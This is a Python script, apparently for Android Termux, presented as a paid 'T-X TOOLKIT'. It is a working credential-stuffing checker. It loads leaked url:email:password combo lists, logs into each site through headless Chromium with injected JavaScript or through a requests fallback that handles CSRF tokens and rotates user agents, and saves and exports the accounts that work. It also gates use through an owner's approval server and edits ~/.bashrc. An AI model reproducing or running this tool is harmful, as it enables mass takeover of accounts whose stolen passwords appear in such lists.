#!/usr/bin/env python3
"""
T-X TOOLKIT v4.0 — Real Chromium Login · Clean Output · File Browser
Created by Saeka Tojirp
Usage : tx
"""

import os, sys, time, re, json, threading, random, hashlib, uuid, shutil, socket, ssl, subprocess
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin
import requests
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
init(autoreset=True)

# ── CONFIG ──
OWNER_SERVER = "https://request-tracker--mitsukitobashi.replit.app"
APPROVED_FILE = os.path.expanduser("~/.tx_approved")
ALIAS_FILE = os.path.expanduser("~/.bashrc")
CHROME = "/data/data/com.termux/files/usr/bin/chromium-browser"

R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW; C = Fore.CYAN; W = Fore.WHITE
DIM = Style.DIM; BRIGHT = Style.BRIGHT; RES = Style.RESET_ALL
COLOR_LOOP = [Fore.RED, Fore.BLUE, Fore.GREEN]
GLITCH = [Fore.RED, Fore.BLUE, Fore.GREEN, Fore.MAGENTA]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Version/17.5 Mobile/15E148 Safari/604.1",
]

# ── UTILS ──
def tw(): return shutil.get_terminal_size().columns
def fix_url(u):
    if not u: return u
    u = u.strip()
    if not u.startswith(('http://','https://')):
        u = 'https://' + u
    return u
def center_print(text, color=W):
    w = tw()
    print(f"{color}{text.center(w)}{RES}")
def spin(text, sec=1.2):
    frm = ['◜','◠','◝','◞','◡','◟']
    end = time.time()+sec; i=0
    while time.time()<end:
        sys.stdout.write(f"\r  {C}{frm[i%6]} {W}{text}{RES}"); sys.stdout.flush()
        time.sleep(0.08); i+=1
    sys.stdout.write("\r"+" "*50+"\r")
def progress(cur, tot, label=""):
    if tot<=0: return
    pct = int((cur/tot)*100)
    filled = int(30*cur/tot)
    bar = f"{G}{'█'*filled}{DIM}{'░'*(30-filled)}{RES}"
    sys.stdout.write(f"\r  {label} |{bar}| {pct}% ({cur}/{tot})")
    sys.stdout.flush()
    if cur==tot: sys.stdout.write("\n")

# ── REAL CHROME ENGINE ──
class RealChrome:
    def __init__(self):
        self.proc = None
    def _start(self):
        args = [CHROME, "--remote-debugging-port=9222", "--no-first-run",
                "--no-default-browser-check", "--disable-gpu", "--disable-software-rasterizer",
                "--disable-dev-shm-usage", "--headless=new"]
        self.proc = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)
    def _stop(self):
        if self.proc:
            self.proc.terminate()
            self.proc = None
    def _ws_url(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('127.0.0.1', 9222))
        sock.send(b"GET /json/version HTTP/1.1\r\nHost: 127.0.0.1:9222\r\nConnection: close\r\n\r\n")
        data = sock.recv(4096).decode()
        sock.close()
        return json.loads(data.split('\r\n\r\n',1)[1])["webSocketDebuggerUrl"]
    def _cmd(self, ws, method, params={}):
        p = urlparse(ws)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ctx = ssl.create_default_context()
        s = ctx.wrap_socket(sock, server_hostname=p.hostname)
        s.connect((p.hostname, p.port))
        hs = (f"GET {p.path}?{p.query} HTTP/1.1\r\nHost: {p.hostname}:{p.port}\r\n"
              f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
              f"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n")
        s.send(hs.encode())
        s.recv(4096)
        payload = json.dumps({"id":1,"method":method,"params":params})
        frame = b'\x81' + bytes([len(payload)]) + payload.encode()
        s.send(frame)
        resp = s.recv(8192)
        s.close()
        return json.loads(resp[2:]) if len(resp)>2 else {}
    def login(self, url, email, password):
        res = {'link':url, 'email':email, 'pass':password, 'active':False, 'info':''}
        url = fix_url(url)
        try:
            self._start()
            ws = self._ws_url()
            self._cmd(ws, "Target.createTarget", {"url":"about:blank"})
            self._cmd(ws, "Page.navigate", {"url":url})
            time.sleep(4)
            js = f"""
                const e=document.querySelector('input[type="email"],input[type="text"],input[name*="email"],input[name*="user"],input[name*="login"]');
                const p=document.querySelector('input[type="password"]');
                if(e)e.value='{email}'; if(p)p.value='{password}';
                const b=document.querySelector('button[type="submit"],input[type="submit"]');
                if(b)b.click(); else if(p&&p.form)p.form.submit(); 'done'
            """
            self._cmd(ws, "Runtime.evaluate", {"expression":js})
            time.sleep(3)
            check = "document.body.innerText.includes('Logout')||document.body.innerText.includes('My Account')||document.body.innerText.includes('Dashboard')||document.body.innerText.includes('Sign Out')"
            r = self._cmd(ws, "Runtime.evaluate", {"expression":check})
            ok = bool(r.get("result",{}).get("value",False))
            if ok:
                res['active'] = True
                res['info'] = "OK"
            else:
                curl = self._cmd(ws, "Runtime.evaluate", {"expression":"window.location.href"})
                cur_url = curl.get("result",{}).get("value","")
                if cur_url and 'login' not in cur_url.lower() and 'signin' not in cur_url.lower():
                    res['active'] = True
                    res['info'] = "Redirect"
                else:
                    res['active'] = False
                    res['info'] = "Invalid"
        except Exception as e:
            res['info'] = f"Err:{str(e)[:30]}"
        finally:
            self._stop()
        return res

# ── HTTP FALLBACK ──
def http_login(url, email, password):
    res = {'link':url, 'email':email, 'pass':password, 'active':False, 'info':''}
    url = fix_url(url)
    sess = requests.Session()
    sess.headers.update({"User-Agent": random.choice(USER_AGENTS)})
    try:
        time.sleep(random.uniform(0.3,1.0))
        r = sess.get(url, timeout=12, allow_redirects=True)
        soup = BeautifulSoup(r.text, 'html.parser')
        form = None
        for f in soup.find_all('form'):
            if f.find('input',{'type':'password'}): form = f; break
        if not form:
            res['info'] = "No form"
            return res
        inputs = {i.get('name'):i.get('value','') for i in form.find_all('input') if i.get('name')}
        uf = next((k for k in inputs if 'user' in k or 'login' in k or 'email' in k), None)
        if not uf:
            for k in inputs:
                if k not in ('password','pass','pwd','submit','button','csrf','token'): uf = k; break
        pf = next((k for k in inputs if 'pass' in k), 'password')
        action = urljoin(url, form.get('action',''))
        csrf_val = next((v for k,v in inputs.items() if 'csrf' in k or 'token' in k), None)
        csrf_name = next((k for k,v in inputs.items() if 'csrf' in k or 'token' in k), None)
        data = {uf:email, pf:password}
        if csrf_name and csrf_val: data[csrf_name] = csrf_val
        for k,v in inputs.items():
            if k not in (uf,pf,csrf_name): data[k] = v
        sess.headers['Referer'] = url
        r2 = sess.post(action, data=data, timeout=12, allow_redirects=True)
        text = r2.text.lower(); final = r2.url.lower()
        ok_kw = ['logout','dashboard','welcome','account','profile','inbox','home','feed','member','sign out']
        fail_kw = ['incorrect','invalid','wrong','error','not found',"doesn't match",'does not match','please try again','login failed']
        if any(k in text for k in ok_kw) and not any(k in text for k in fail_kw):
            res['active'] = True; res['info'] = "OK"
        elif any(k in text for k in fail_kw):
            res['active'] = False; res['info'] = "Invalid"
        elif 'login' not in final and 'signin' not in final:
            res['active'] = True; res['info'] = "Redirect"
        elif len(sess.cookies) > 2:
            res['active'] = True; res['info'] = "Cookies"
        else:
            res['active'] = False; res['info'] = "Login page"
    except Exception as e:
        res['info'] = f"Err:{str(e)[:30]}"
    return res

# ── AUTH ──
def gen_token(name):
    raw = f"{name}-{uuid.uuid4().hex}-{int(time.time())}"
    return hashlib.sha256(raw.encode()).hexdigest()[:16].upper()
def get_token(name):
    if os.path.exists(APPROVED_FILE):
        with open(APPROVED_FILE) as f:
            if f.read().strip()=='approved': return None,'approved'
    token = gen_token(name)
    try:
        r = requests.post(f"{OWNER_SERVER}/api/request", json={"name":name,"token":token}, timeout=8)
        if r.status_code==201 and r.json().get('status')=='approved':
            with open(APPROVED_FILE,'w') as f: f.write('approved')
            return token,'approved'
        return token,'pending'
    except: return token,'pending'
def wait_ok(token):
    while True:
        try:
            r = requests.get(f"{OWNER_SERVER}/api/status/{token}", timeout=5)
            if r.status_code==200:
                d = r.json()
                if d['status']=='approved':
                    with open(APPROVED_FILE,'w') as f: f.write('approved')
                    return True
                if d['status']=='declined': return False
        except: pass
        time.sleep(3)

# ── MAIN ──
def main():
    for _ in range(10):
        os.system('clear')
        spin("Loading...",0.5)
        center_print("WELCOME TO T-X TOOLKIT", random.choice(COLOR_LOOP))
        time.sleep(0.5)
    os.system('clear')
    center_print("WHAT SHOULD YOUR NAME BE?", Y)
    name = input(f"  {W}> {RES}").strip() or "User"
    os.system('clear')
    token, status = get_token(name)
    if status=='approved':
        center_print("ACCESS GRANTED", G)
        time.sleep(1)
    else:
        center_print("PERMISSION REQUIRED!", R)
        time.sleep(0.5)
        center_print(f"YOUR REQUEST TOKEN IS {token}", W)
        center_print("PLEASE ASK THE OWNER TO APPROVE", DIM)
        if not wait_ok(token):
            center_print("REQUEST DECLINED!", R)
            sys.exit(0)
        os.system('clear')
        center_print("ACCESS GRANTED", G)
        time.sleep(1)

    combo_file = None
    hits = []
    chrome = RealChrome()

    while True:
        os.system('clear')
        w = tw()
        print(f"{G}HI! {name}{RES}  {DIM}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{RES}\n")
        title = "T-X PAID TOOL"
        for i,ch in enumerate(title): sys.stdout.write(f"{GLITCH[i%4]}{ch}{RES}")
        print("\n")
        menu = ["[ 1 ] START CHECKING","[ 2 ] SEE ACCOUNT HITS!","[ 3 ] EXPORT LOGS","[ 4 ] SETUP FILE PATH","[ 5 ] EXIT"]
        for idx,line in enumerate(menu):
            if idx==3 and not combo_file: print(f"  {R}{line}{RES}")
            else: print(f"  {W}{line}{RES}")
        t = int(time.time())%10//5
        cc = COLOR_LOOP[t]
        print(f"\n  {cc}Created{RES} by Saeka Tojirp.", end='')
        try: choice = input(f"\n  {W}> {RES}").strip()
        except: break

        if choice=='1':
            if not combo_file:
                print(f"  {R}Set file path first.{RES}"); time.sleep(1); continue
            combos = []
            with open(combo_file,'r',encoding='utf-8',errors='ignore') as f:
                for line in f:
                    line=line.strip()
                    if not line or line.startswith('#'): continue
                    if '|' in line:
                        parts=line.split('|')
                        if len(parts)>=3: combos.append((parts[0].strip(),parts[1].strip(),'|'.join(parts[2:]).strip()))
                    elif '://' in line:
                        proto,rest=line.split('://',1)
                        if ':' in rest:
                            domain,creds=rest.split(':',1)
                            e,p=creds.split(':',1) if ':' in creds else (creds,'')
                            combos.append((proto+'://'+domain,e.strip(),p.strip()))
                    else:
                        parts=line.split(':')
                        if len(parts)>=3: combos.append((parts[0].strip(),parts[1].strip(),':'.join(parts[2:]).strip()))
            if not combos:
                print(f"  {R}No combos.{RES}"); time.sleep(1); continue
            results=[]; total=len(combos); done=0; active=0; lock=threading.Lock()
            print(f"\n  {Y}{'LINK':<35} {'|'} {'USER/EMAIL':<28} {'|'} {'PASS':<20} {'|'} {'STATUS'}{RES}")
            print(f"  {DIM}{'─'*90}{RES}")
            def worker(url,email,pw):
                nonlocal done,active
                r = chrome.login(url,email,pw)
                if not r['active'] and 'Err' in r.get('info',''): r = http_login(url,email,pw)
                with lock:
                    results.append(r); done+=1
                    if r['active']: active+=1
                    st = f"{G}ACTIVE{RES}" if r['active'] else f"{R}INVALID{RES}"
                    print(f"  {W}{r['link'][:33]:<35}{DIM} | {RES}{W}{r['email'][:26]:<28}{DIM} | {RES}{W}{r['pass'][:18]:<20}{DIM} | {RES}{st}")
                    progress(done,total,"Checking")
            with ThreadPoolExecutor(max_workers=3) as ex:
                for url,email,pw in combos: ex.submit(worker,url,email,pw)
            print(f"\n  {G}{active}/{total} active.{RES}")
            hits.extend([r for r in results if r['active']]); time.sleep(1)

        elif choice=='2':
            os.system('clear')
            if not hits: print(f"  {Y}No hits.{RES}")
            else:
                page=0; per=5
                while True:
                    os.system('clear')
                    print(f"  {G}HITS{RES}  Page {page+1}/{ (len(hits)-1)//per +1 }")
                    for r in hits[page*per:(page+1)*per]: print(f"  {r['email']}:{r['pass']}")
                    print(f"\n  {DIM}[N]ext [P]rev [Q]uit{RES}")
                    k=input().strip().lower()
                    if k=='n' and page<(len(hits)-1)//per: page+=1
                    elif k=='p' and page>0: page-=1
                    elif k=='q': break
            time.sleep(0.5)

        elif choice=='3':
            fn=f"export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(fn,'w') as f: json.dump(hits,f,indent=2)
            print(f"  {G}Exported to {fn}{RES}"); time.sleep(1)

        elif choice=='4':
            os.system('clear')
            print(f"  {Y}BROWSE FOR COMBO FILE{RES}\n")
            dirs = [os.path.expanduser("~"), os.path.expanduser("~/downloads"),
                    "/sdcard", "/storage/emulated/0", "/storage/emulated/0/Download"]
            dirs = [d for d in dirs if os.path.isdir(d)]
            print(f"  {W}Quick access:{RES}")
            for i,d in enumerate(dirs): print(f"  {G}[{i+1}]{RES} {d}")
            print(f"  {G}[M]{RES} Manual path entry\n  {G}[0]{RES} Back")
            c2 = input(f"  {W}> {RES}").strip()
            if c2=='0': continue
            if c2.upper()=='M':
                p = input(f"  {W}Full path: {RES}").strip()
                p = os.path.expanduser(p)
                if os.path.exists(p): combo_file = p; print(f"  {G}File set!{RES}")
                else: print(f"  {R}Not found.{RES}")
                time.sleep(1)
            elif c2.isdigit() and 1<=int(c2)<=len(dirs):
                cur = dirs[int(c2)-1]; page=0; per=15
                while True:
                    os.system('clear')
                    print(f"  {Y}Browsing: {cur}{RES}\n")
                    try: items = sorted(os.listdir(cur))
                    except: print(f"  {R}Permission denied.{RES}"); time.sleep(1); break
                    visible = []
                    for it in items:
                        full = os.path.join(cur,it)
                        if os.path.isdir(full) and not it.startswith('.'): visible.append(('DIR',it))
                        elif os.path.isfile(full) and (it.endswith('.txt') or 'combo' in it.lower() or 'ulp' in it.lower()): visible.append(('FILE',it))
                    total_pages = (len(visible)-1)//per+1 if visible else 1
                    start = page*per
                    for i,(tp,nm) in enumerate(visible[start:start+per], start):
                        pre = f"{C}[DIR]{RES}" if tp=='DIR' else f"{W}[FILE]{RES}"
                        print(f"  {G}[{i+1}]{RES} {pre} {nm}")
                    if not visible: print(f"  {DIM}No compatible files.{RES}")
                    print(f"\n  {DIM}Page {page+1}/{total_pages} | [N]ext [P]rev [B]ack [M]anual{RES}")
                    sel = input(f"  {W}> {RES}").strip()
                    if sel.upper()=='B': break
                    elif sel.upper()=='N' and page<total_pages-1: page+=1
                    elif sel.upper()=='P' and page>0: page-=1
                    elif sel.upper()=='M':
                        p = input(f"  {W}Full path: {RES}").strip()
                        p = os.path.expanduser(p)
                        if os.path.isfile(p): combo_file = p; print(f"  {G}File set!{RES}"); time.sleep(1); break
                        elif os.path.isdir(p): cur = p; page=0
                        else: print(f"  {R}Not found.{RES}"); time.sleep(0.8)
                    elif sel.isdigit():
                        idx = int(sel)-1
                        if 0<=idx<len(visible):
                            tp,nm = visible[idx]
                            full = os.path.join(cur,nm)
                            if tp=='DIR': cur = full; page=0
                            else: combo_file = full; print(f"  {G}File set!{RES}"); time.sleep(1); break
        elif choice=='5': break

def setup_alias():
    if not os.path.exists(ALIAS_FILE): return
    alias_cmd = "alias tx='python3 ~/tx_toolkit.py'"
    with open(ALIAS_FILE) as f:
        if alias_cmd not in f.read(): os.system(f"echo \"{alias_cmd}\" >> {ALIAS_FILE}")

if __name__=="__main__":
    setup_alias()
    main()
